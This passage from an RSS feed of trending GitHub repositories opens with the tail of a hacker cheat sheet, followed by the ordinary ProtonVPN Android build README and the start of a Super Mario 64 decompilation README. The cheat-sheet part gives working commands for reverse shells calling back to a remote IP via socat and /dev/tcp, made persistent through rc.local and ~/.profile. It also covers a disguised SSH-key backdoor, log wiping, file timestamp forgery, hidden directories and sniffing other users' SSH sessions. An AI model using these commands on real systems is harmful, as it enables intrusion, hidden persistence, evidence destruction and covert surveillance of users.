&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-rsup2-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.ii.b. Upgrade a reverse shell to a fully interactive shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;...and if we also like to use Ctrl-C etc then we have to go all the way and upgrade the reverse shell to a real fully colorful interactive shell:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# On the target host spwan a PTY using any of the above examples:
$ python -c 'import pty; pty.spawn("/bin/bash")'

# Now Press Ctrl-Z to suspend the connection and return to your own terminal.
# On your terminal execute:
$ stty raw -echo

# ...and bring the connection back into the foreground:
$ fg
$ reset

# On target host
$ export SHELL=bash
$ export TERM=xterm-256color
$ stty rows 24 columns 80
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-rssc-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;5.ii.c. Reverse shell with socat (fully interactive)&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;...or install socat and get it done without much fiddling about:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# on attacker's host (listener)
socat file:`tty`,raw,echo=0 tcp-listen:1524
# on target host (reverse shell)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-bd-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-bdrs-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;6.i. Background reverse shell&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;A reverse shell that keeps trying to connect back to us every 3600 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ while :; do setsid bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1; sleep 3600; done &amp;amp;&amp;gt;/dev/null &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;or add to &lt;em&gt;/etc/rc.local&lt;/em&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;nohup bash -c 'while :; do setsid bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1; sleep 3600; done' &amp;amp;&amp;gt;/dev/null &amp;amp;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;or the user's &lt;em&gt;~/.profile&lt;/em&gt; (also stops multiple instances from being started):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;fuser /dev/shm/.busy &amp;amp;&amp;gt;/dev/null
if [ $? -eq 1 ]; then
        nohup /bin/bash -c 'while :; do touch /dev/shm/.busy; exec 3&amp;lt;/dev/shm/.busy; setsid bash -i &amp;amp;&amp;gt;/dev/tcp/3.13.3.7/1524 0&amp;gt;&amp;amp;1 ; sleep 3600; done' &amp;amp;&amp;gt;/dev/null &amp;amp;
fi
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-bdak-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;6.ii. authorized_keys&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Add your ssh public key to &lt;em&gt;/root/.ssh/authorized_keys&lt;/em&gt;. It's the most reliable backdoor ever :&amp;gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;It survives reboots.&lt;/li&gt;
&lt;li&gt;It even survives re-installs. Admins have been known to make a backup of authorized_keys and then put it straight back onto the newly installed system.&lt;/li&gt;
&lt;li&gt;We have even seen our key being copied to other companies!&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Tip: Change the name at the end of the ssh public keyfile to something obscure like &lt;em&gt;backup@ubuntu&lt;/em&gt; or the admin's real name:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ cat id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCktFkgm40GDkqYwJkNZVb+NLqYoUNSPVPLx0VDbJM0
[...]
u1i+MhhnCQxyBZbrWkFWyzEmmHjZdAZCK05FRXYZRI9yadmvo7QKtRmliqABMU9WGy210PTOLMltbt2C
c3zxLNse/xg0CC16elJpt7IqCFV19AqfHnK4YiXwVJ+M+PyAp/aEAujtHDHp backup@ubuntu
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-sh-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-shsf-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;7.i. Shred &amp;amp; Erase a file&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ shred -z foobar.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-shsfwo-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;7.ii. Shred &amp;amp; Erase without &lt;em&gt;shred&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ FN=foobar.txt; dd bs=1k count="`du -sk \"${FN}\" | cut -f1`" if=/dev/urandom &amp;gt;"${FN}"; rm -f "${FN}"
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Note: Or deploy your files in &lt;em&gt;/dev/shm&lt;/em&gt; directory so that no data is written to the harddrive. Data will be deleted on reboot.&lt;/p&gt;
&lt;p&gt;Note: Or delete the file and then fill the entire harddrive with /dev/urandom and then rm -rf the dump file.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-shrdf-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;7.iii. Restore the date of a file&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Let's say you have modified &lt;em&gt;/etc/passwd&lt;/em&gt; but the file date now shows that &lt;em&gt;/etc/passwd&lt;/em&gt; has been modifed. Use &lt;em&gt;touch&lt;/em&gt; to change the file data to the date of another file (in this example, &lt;em&gt;/etc/shadow&lt;/em&gt;)&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ touch -r /etc/shadow /etc/passwd
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-shcl-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;7.iv. Clear logfile&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;This will reset the logfile to 0 without having to restart syslogd etc:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# cat /dev/null &amp;gt;/var/log/auth.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will remove any sign of us from the log file:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# cd /dev/shm
# grep -v 'thc\.org' /var/log/auth.log &amp;gt;a.log; cat a.log &amp;gt;/var/log/auth.log; rm -f a.log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-shhu-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;7.v. Hide files from that User without root privileges&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Our favorite working directory is &lt;em&gt;/dev/shm/&lt;/em&gt;. This location is volatile memory and will be lost on reboot. NO LOGZ == NO CRIME.&lt;/p&gt;
&lt;p&gt;Hiding permanent files:&lt;/p&gt;
&lt;p&gt;Method 1:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ alias ls='ls -I system-dev'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This will hide the directory &lt;em&gt;system-dev&lt;/em&gt; from the &lt;em&gt;ls&lt;/em&gt; command. Place in User's &lt;em&gt;~/.profile&lt;/em&gt; or system wide &lt;em&gt;/etc/profile&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Method 2:
Tricks from the 80s. Consider any directory that the admin rarely looks into (like &lt;em&gt;/boot/.X11/..&lt;/em&gt; or so):&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mkdir '...'
$ cd '...'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Method 3:
Unix allows filenames with about any ASCII character but 0x00. Try tab (&lt;em&gt;\t&lt;/em&gt;). Happens that most Admins do not know how to cd into any such directory.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ mkdir $'\t'
$ cd $'\t'
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-cr-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-crgrp-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;8.i. Generate quick random Password&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Good for quick passwords without human element.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl rand -base64 24
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;If &lt;code&gt;openssl&lt;/code&gt; is not available then we can also use &lt;code&gt;head&lt;/code&gt; to read from &lt;code&gt;/dev/urandom&lt;/code&gt;.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ head -c 32 &amp;lt; /dev/urandom | xxd -p -c 32
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-crltefs-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;8.ii. Linux transportable encrypted filesystems&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Create a 256MB large encrypted file system. You will be prompted for a password.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ dd if=/dev/urandom of=/tmp/crypted bs=1M count=256 iflag=fullblock
$ cryptsetup luksFormat /tmp/crypted
$ mkfs.ext3 /tmp/crypted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Mount:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# losetup -f
# losetup /dev/loop0 /tmp/crypted
# cryptsetup open /dev/loop0 crypted
# mount -t ext3 /dev/mapper/crypted /mnt/crypted
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Store data in &lt;code&gt;/mnt/crypted&lt;/code&gt;, then unmount:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# umount /mnt/crypted
# cryptsetup close crypted
# losetup -d /dev/loop0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;a id="user-content-misc-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;8.iii Encrypting a file&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Encrypt your 0-Days and log files before transfering them - please. (and pick your own password):&lt;/p&gt;
&lt;p&gt;Encrypt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl enc -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I &amp;lt;input.txt &amp;gt;input.txt.enc
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Decrypt:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ openssl enc -d -aes-256-cbc -pbkdf2 -k fOUGsg1BJdXPt0CY4I &amp;lt;input.txt.enc &amp;gt;input.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;&lt;a id="user-content-misc-anchor"&gt;&lt;/a&gt;
&lt;a id="user-content-sss-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;9.i. Sniff a user's SSH session&lt;/strong&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ strace -e trace=read -p &amp;lt;PID&amp;gt; 2&amp;gt;&amp;amp;1 | while read x; do echo "$x" | grep '^read.*= [1-9]$' | cut -f2 -d\"; done
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Dirty way to monitor a user who is using &lt;em&gt;ssh&lt;/em&gt; to connect to another host from a computer that you control.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-ssswor-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;9.ii. Sniff a user's SSH session without root privileges&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Even dirtier way in case &lt;em&gt;/proc/sys/kernel/yama/ptrace_scope&lt;/em&gt; is set to 1 (strace will fail on already running SSH clients unless uid=0)&lt;/p&gt;
&lt;p&gt;Create a wrapper script called 'ssh' that executes strace + ssh to log the session:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Add a local path to the PATH variable so our 'ssh' is executed instead of the real ssh:
$ echo '$PATH=~/.local/bin:$PATH' &amp;gt;&amp;gt;~/.profile

# Create a log directory and our own ssh binary
$ mkdir -p ~/.local/bin ~/.ssh/logs

$ cat &amp;gt;~/.local/bin/ssh
#! /bin/bash
strace -e trace=read -o '! ~/.local/bin/ssh-log $$' /usr/bin/ssh $@
# now press CTRL-d to close the file.

$ cat ~/.local/bin/ssh-log
#! /bin/bash
grep 'read(4' | cut -f2 -d\" | while read -r x; do
        if [ ${#x} -ne 2 ] &amp;amp;&amp;amp; [ ${#x} -ne 1 ]; then continue; fi
        if [ x"${x}" == "x\\n" ] || [ x"${x}" == "x\\r" ]; then
                echo ""
        else
                echo -n "${x}"
        fi
done &amp;gt;~/.ssh/.logs/ssh-log-"${1}"-`date +%s`.txt
# now press CTRL-d to close the file

$ chmod 755 ~/.local/bin/ssh ~/.local/bin/ssh-log
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The SSH session will be sniffed and logged to &lt;em&gt;~/.ssh/logs/&lt;/em&gt; the next time the user logs into his shell and uses SSH.&lt;/p&gt;
&lt;p&gt;&lt;a id="user-content-hlc-anchor"&gt;&lt;/a&gt;
&lt;strong&gt;9.iii. How to survive high latency connections&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;Hacking over long latency links or slow links can be frustrating. Every keystroke is transmitted one by one and any typo becomes so much more frustrating and time consuming to undo. &lt;em&gt;rlwrap&lt;/em&gt; comes to the rescue. It buffers all single keystrokes until &lt;em&gt;Enter&lt;/em&gt; is hit and then transmits the entire line at once. This makes it so much easier to type at high speed, correct typos, ...&lt;/p&gt;
&lt;p&gt;Example for the receiving end of a revese tunnel:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ rlwrap nc -vnlp 1524
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Example for &lt;em&gt;SSH&lt;/em&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;$ rlwrap ssh user@host
&lt;/code&gt;&lt;/pre&gt;
&lt;hr&gt;
&lt;p&gt;Shoutz: ADM, Oscar2020&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>hackerschoice</author><guid isPermaLink="false">https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet</guid><pubDate>Tue, 04 Feb 2020 00:01:00 GMT</pubDate></item><item><title>ProtonVPN/android-app #2 in C, This week</title><link>https://github.com/ProtonVPN/android-app</link><description>&lt;p&gt;&lt;i&gt;Official ProtonVPN Android app&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-protonvpn-for-android" class="anchor" aria-hidden="true" href="#protonvpn-for-android"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;ProtonVPN for Android&lt;/h1&gt;
&lt;p&gt;Copyright (c) 2019 Proton Technologies AG&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-build-instructions" class="anchor" aria-hidden="true" href="#build-instructions"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build instructions&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Install sdk, ndk, cmake, swig&lt;/li&gt;
&lt;li&gt;Clone this repository&lt;/li&gt;
&lt;li&gt;&lt;code&gt;./gradlew assembleProdDebug&lt;/code&gt; or open and build in Android Studio&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;&lt;a id="user-content-build-release" class="anchor" aria-hidden="true" href="#build-release"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Build release&lt;/h3&gt;
&lt;p&gt;To complete a release build signing keys need to be provided:
./gradlew assembleProdRelease -PkeyStoreFilePath= -PkeyStoreKeyAlias= -PkeyStorePassword= -PkeyStoreKeyPassword=`&lt;/p&gt;
&lt;h3&gt;&lt;a id="user-content-rebuild-strongswan" class="anchor" aria-hidden="true" href="#rebuild-strongswan"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Rebuild strongswan&lt;/h3&gt;
&lt;p&gt;This project is using native libraries from &lt;a href="https://www.strongswan.org/" rel="nofollow"&gt;open-source project Strongswan&lt;/a&gt;.
To simplify the build process we include prebuilt copies of those libraries &lt;a href="app/src/main/jniLibs"&gt;here&lt;/a&gt;. To rebuild them follow these steps:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;git submodule init&lt;/code&gt; followed by &lt;code&gt;git submodule update&lt;/code&gt; in the main directory (we include original Strongswan repository as a git submodule)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;cd strongswan&lt;/code&gt; and follow &lt;a href="https://wiki.strongswan.org/projects/strongswan/wiki/AndroidVPNClientBuild" rel="nofollow"&gt;build instructions&lt;/a&gt; from Strongswan to rebuild native libraries&lt;/li&gt;
&lt;li&gt;after a successful build, run &lt;code&gt;cp -r strongswan/src/frontends/android/app/src/main/libs/* app/src/main/jniLibs&lt;/code&gt; in our main directory to copy the prebuilt libraries and rebuild the ProtonVPN client&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-code-style" class="anchor" aria-hidden="true" href="#code-style"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Code style&lt;/h2&gt;
&lt;p&gt;Project uses agreed code style ProtonStyle.xml for java. Import it in Android studio via &lt;code&gt;File&amp;gt;&amp;gt;Settings&amp;gt;&amp;gt;Editor&amp;gt;&amp;gt;Code style&amp;gt;&amp;gt;Import Scheme&lt;/code&gt;
For kotlin's code style we use ktlint with default rules&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-contributing" class="anchor" aria-hidden="true" href="#contributing"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Contributing&lt;/h2&gt;
&lt;p&gt;If you would like to contribute, please keep in mind the following rules:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Try to stick to the project's existing code style and naming conventions&lt;/li&gt;
&lt;li&gt;The code base is mostly written in Java, but we are transitioning to Kotlin, so new code should be written in Kotlin where possible&lt;/li&gt;
&lt;li&gt;Our preferred tech stack is Kotlin, MVVM, data-binding and coroutines, so any new features or large refactors should conform to this preferred tech stack&lt;/li&gt;
&lt;li&gt;After adding/updating open source dependencies run &lt;code&gt;gradlew updateLicensesJson&lt;/code&gt; to update attributions.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Internally our CI automatically checks all pull requests for code style issues, and runs our tests. However you can run those locally as well.&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;gradlew checkstyle
gradlew ktlint
gradlew &lt;span class="pl-c1"&gt;test&lt;/span&gt;
gradlew androidTest&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;By making a contribution to this project you agree to the following:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;I assign any and all copyright related to the contribution to Proton Technologies AG;&lt;/li&gt;
&lt;li&gt;I certify that the contribution was created in whole by me;&lt;/li&gt;
&lt;li&gt;I understand and agree that this project and the contribution are public and that a record of the contribution (including all personal information I submit with it) is maintained indefinitely and may be redistributed with this project or the open source license(s) involved.&lt;/li&gt;
&lt;/ol&gt;
&lt;h2&gt;&lt;a id="user-content-versioning" class="anchor" aria-hidden="true" href="#versioning"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Versioning&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;Version matches format: &lt;code&gt;[major][minor][patch]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2&gt;&lt;a id="user-content-license" class="anchor" aria-hidden="true" href="#license"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;License&lt;/h2&gt;
&lt;p&gt;The code and datafiles in this distribution are licensed under the terms of the GPLv3 as published by the Free Software Foundation. See &lt;a href="https://www.gnu.org/licenses/" rel="nofollow"&gt;https://www.gnu.org/licenses/&lt;/a&gt; for a copy of this license.&lt;/p&gt;
&lt;p&gt;Copyright (c) 2019 Proton Technologies AG&lt;/p&gt;
&lt;/article&gt;&lt;/div&gt;</description><author>ProtonVPN</author><guid isPermaLink="false">https://github.com/ProtonVPN/android-app</guid><pubDate>Tue, 04 Feb 2020 00:02:00 GMT</pubDate></item><item><title>n64decomp/sm64 #3 in C, This week</title><link>https://github.com/n64decomp/sm64</link><description>&lt;p&gt;&lt;i&gt;A Super Mario 64 decompilation, brought to you by a bunch of clever folks.&lt;/i&gt;&lt;/p&gt;&lt;div id="readme" class="md" data-path="README.md"&gt;&lt;article class="markdown-body entry-content p-5" itemprop="text"&gt;&lt;h1&gt;&lt;a id="user-content-super-mario-64" class="anchor" aria-hidden="true" href="#super-mario-64"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Super Mario 64&lt;/h1&gt;
&lt;p&gt;This repo contains a full decompilation of Super Mario 64 (J) and (U).
The source and data have been decompiled but complete naming and documentation
all of the code and data is still a work in progress. Decompiling the (E) ROM
is also an ongoing effort.&lt;/p&gt;
&lt;p&gt;It builds the following ROMs:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;sm64.jp.z64 &lt;code&gt;sha1: 8a20a5c83d6ceb0f0506cfc9fa20d8f438cafe51&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;sm64.us.z64 &lt;code&gt;sha1: 9bef1128717f958171a4afac3ed78ee2bb4e86ce&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;This repo does not include all assets necessary for compiling the ROMs.
A prior copy of the game is required to extract the required assets.&lt;/p&gt;
&lt;h2&gt;&lt;a id="user-content-installation" class="anchor" aria-hidden="true" href="#installation"&gt;&lt;svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"&gt;&lt;path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;Installation&lt;/h2&gt;
